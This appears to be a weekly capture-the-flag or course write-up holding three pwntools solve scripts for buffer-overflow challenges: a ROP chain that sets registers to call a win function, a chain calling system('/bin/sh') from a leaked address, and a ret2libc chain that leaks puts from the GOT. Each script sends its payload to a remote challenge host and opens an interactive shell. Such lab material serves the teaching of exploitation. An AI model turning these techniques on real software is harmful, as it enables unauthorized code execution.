+++
title = "Week 02"
weight = 1
slug="week-02"
description = "ROPchain modify registers and call function, use leaked system address to call system('/bin/sh'), leak libc using puts and call system('/bin/sh')"
+++

# args
ROPchain to modify registers and call function

Solve script:
``` py
from pwn import *

p = remote("128.199.12.141", 7010)

buf = b'A'*40

win = p64(0x401142)

rdi_ret = p64(0x40121b)

rsi_r15_ret = p64(0x401219)

payload = buf + rdi_ret + p64(0xAAAA) + rsi_r15_ret + p64(0xBBBB) + p64(0xBBBB) + win

p.sendline(payload)

p.interactive()
```

# leaked
Use leaked system address to call system("/bin/sh")

Solve script:
``` py
from pwn import *

p = remote("128.199.12.141", 7001)

leak = p.recvuntil(b',')
system = p64(int(leak[-15:-1].decode(), 16))

buf = b'A'*40

bin_sh = p64(0x402008)

rdi_ret = p64(0x40122b)

p.sendline(buf + rdi_ret + bin_sh + system)

p.interactive()
```

# leakme
Leak libc using puts and call system("/bin/sh")

Solve script:
``` py
from pwn import *

p = remote("128.199.12.141", 7002)

exe = ELF("./leakme")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

puts_plt = p64(0x401030)
puts_got = p64(exe.got['puts'])

bin_sh = p64(0x402008)

rdi_ret = p64(0x4011fb)

vuln = p64(0x401142)

buf = b'A'*40

p.recv()

payload = buf + rdi_ret + puts_got + puts_plt + vuln
p.sendline(payload)

leak = p.recvline()

base = u64(leak.rstrip().ljust(8, b'\x00')) - libc.symbols['puts']

system = p64(base + libc.symbols['system'])

payload2 = buf + rdi_ret + bin_sh + system

p.sendline(payload2)

p.interactive()
```
